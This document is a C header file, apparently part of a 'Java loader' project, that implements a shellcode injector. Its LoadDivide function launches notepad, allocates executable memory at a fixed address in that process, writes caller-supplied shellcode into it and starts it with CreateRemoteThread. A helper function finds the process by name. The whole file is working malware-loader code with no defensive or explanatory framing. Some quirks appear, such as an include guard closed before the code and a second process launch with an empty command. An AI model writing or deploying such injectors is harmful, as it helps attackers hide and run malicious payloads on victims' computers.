#ifndef JAVA_LOADER_DIVIDE_H
#define JAVA_LOADER_DIVIDE_H

#endif //JAVA_LOADER_DIVIDE_H

#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <tchar.h>

DWORD GetProcessIdByName1(LPCTSTR name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 entry = {sizeof(PROCESSENTRY32)};
    if (Process32First(snapshot, &entry)) {
        do {
            if (_tcsicmp(entry.szExeFile, name) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

int LoadDivide(unsigned char *shellcode, int len) {
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    CreateProcessA(NULL, (LPSTR) "notepad", NULL,
                   NULL, FALSE, 0,
                   NULL, NULL, &si, &pi);
    VirtualAllocEx(pi.hProcess,
                   (PVOID) 0x0000480000000000, 0x1000,
                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess,
                       (PVOID) 0x0000480000000000, shellcode, len, NULL);

    char cmd[MAX_PATH] = {0};

    CreateProcessA(NULL, (LPSTR) cmd, NULL,
                   NULL, FALSE,
                   0, NULL, NULL,
                   &si, &pi);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,
                                  0, GetProcessIdByName1("notepad.exe"));
    CreateRemoteThread(hProcess, 0, 0,
                       (LPTHREAD_START_ROUTINE) 0x0000480000000000,
                       0, 0, 0);
    return 0;
}
